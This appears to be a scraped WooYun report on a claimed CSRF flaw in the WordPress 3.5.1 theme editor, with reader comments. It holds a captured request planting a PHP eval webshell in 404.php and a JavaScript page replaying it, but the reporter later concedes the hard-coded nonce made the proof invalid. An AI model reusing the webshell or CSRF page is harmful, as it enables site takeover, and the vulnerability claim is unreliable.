{"id": 11896, "wybug_id": "wooyun-2013-020878", "wybug_title": "wordpress后台CSRF不严，管理员访问某些链接可拿shell", "wybug_corp": "wordpress", "wybug_author": "小贱人", "wybug_date": "2013-03-29 12:43", "wybug_open_date": "2013-06-27 12:44", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "应用配置错误", "利用技巧", "绕过", "类型应用", "漏洞利用", "敏感接口缺乏校验"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-29：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-06-27：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： wordpress3.5.1后台修改主题模版处防CSRF不严，前台评论可加入超链接，可写上诱惑性东西 骗取管理员点击后写入一句话木马 详细说明：  进入后台-外观-编辑。选择编辑Twenty Twelve主题下的404.php文件。将原内容去掉，换成一句话木马，同时打开抓包工具。\n\n更新后抓到包 \npost http://localhost/wp/wp-admin/theme-editor.phpHost: localhostUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:19.0) Gecko/20100101 Firefox/19.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://localhost/wp/wp-admin/theme-editor.php?file=404.php&theme=twentytwelveCookie: wordpress_1233097993469c07c80a9cb529880b71=admin%7C1364700254%7Cb875aa22d9bb88383aa6f9b1628dd86b; wp-settings-time-1=1364445495; comment_author_1233097993469c07c80a9cb529880b71=test; comment_author_email_1233097993469c07c80a9cb529880b71=632117384%40qq.com; wp-settings-1=editor%3Dhtml; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1233097993469c07c80a9cb529880b71=admin%7C1364700254%7C082956c79c01926f6f107ccd131dade7; s5wJ_2132_saltkey=uNFgCP80; s5wJ_2132_lastvisit=1364366389; s5wJ_2132_ulastactivity=591affdyS6zMRtF88Jad%2BTVr47oX95MIizEQOFn8RMF%2BN%2FpUUHdwConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 268_wpnonce=b6cda66293&_wp_http_referer=%2Fwp%2Fwp-admin%2Ftheme-editor.php%3Ffile%3D404.php%26theme%3Dtwentytwelve&newcontent=%3C%3Fphp+eval%28%24_GET%5Ba%5D%29%3B%3F%3E&action=update&file=404.php&theme=twentytwelve&scrollto=0&submit=%E6%9B%B4%E6%96%B0%E6%96%87%E4%BB%B6\n由于本地演示，用AJAX进行CSRF攻击。编写localhost/wp.html文件。内容为\n<script>function CreateRquest(){var httpRequest;try{httpRequest=new ActiveXObject(\"Msxml2.XMLHTTP\");}catch(e){try{httpRequest=new ActiveXObject(\"Microsoft.XMLHTTP\");}catch(e1){httpRequest=new XMLHttpRequest();}}return httpRequest;}var request=CreateRquest();request.open(\"post\",\"http://localhost/wp/wp-admin/theme-editor.php\",true);request.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");var a=\"_wpnonce=b6cda66293&_wp_http_referer=%2Fwp%2Fwp-admin%2Ftheme-editor.php%3Ffile%3D404.php%26theme%3Dtwentytwelve&newcontent=<?php eval($_GET[a]);?>&action=update&file=404.php&theme=twentytwelve&scrollto=0&submit=%E6%9B%B4%E6%96%B0%E6%96%87%E4%BB%B6\";request.send(a);</script>\n将被修改的404.PHP恢复，并且在前台评论写入<a href=\"http://localhost/wp.html\">管理员，有一篇文章也讲到了这个问题管理员登录后台查看评论。点击链接后 Twenty Twelve主题下的404.php已被成功修改为一句话木马\n\n访问一句话木马\n\n攻击成功，AJAX仅为演示，实战中可用JS控制表单自动提交来实现跨域传输数据。   漏洞证明：  管理员点击相关链接后，成功在404页面写入一句话木马 并访问成功\n\nAJAX仅为本地测试用，实战中可在恶意页面中用JS控制表单自动提交。   修复方案：  你们比我懂   版权声明：转载请注明来源 小贱人@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：4 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2013-03-29 12:45 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:17        | 当我又回首一切,这个世界会好吗?)\t\t \n  wordpress有token的吧    \n     2013-03-29 12:45 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:17        | 当我又回首一切,这个世界会好吗?)\t\t \n  @xsser 不过利用那个swf的xss倒是可以一搞    \n     2013-03-29 13:07 |    \t\tRookie \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:78        | 123)\t\t \n  @xsser 自问自答 真的很强    \n     2013-03-29 14:29 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:66        | 铁甲依然在)\t\t \n  @痩蛟舞 我也at下自己看    \n     2013-03-29 16:08 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:29        | Focus On Web Secur1ty)\t\t \n  @saline 表示关注    \n     2013-03-29 16:48 |    \t\t空城 \t\t\t( 实习白帽子  |\t\t\t        Rank:94 漏洞数:11        | 这个人很懒，什么也没有留下)\t\t \n  @小贱人 @xsser 那个token怎么bypass？    \n     2013-03-29 16:49 |    \t\t小贱人 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 资深菜鸟，)\t\t \n  第一个测试的CSRF是添加管理员用户，但发现了不可预测的token.每次重启服务器token都会变化，但重启前无论管理员登录登出TOKEN都相同。第二个测试的CSRF是修改模版。写好POC后发现服务器重启多少次后POC都有效，于是以为CSRF可用，上报乌云。收到xsser的邮件后，重新安装了WORDPRESS。发现POC无法用。诡异的WORDPRESS。在此说明，以避骗token之嫌    \n     2013-03-29 16:50 |    \t\t小贱人 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 资深菜鸟，)\t\t \n  说错 是骗rank之嫌    \n     2013-03-31 17:29 |    \t\tDrizzle.Risk \t\t\t( 普通白帽子  |\t\t\t        Rank:255 漏洞数:19        | You have an error in your SQL syntax; ch...)\t\t \n  关注..    \n     2013-06-27 16:11 |    \t\t夜 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:4        | 小夜，一个苦逼程序员)\t\t \n  你那写一句话也太麻烦了吧！    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 4, "Ranks": null}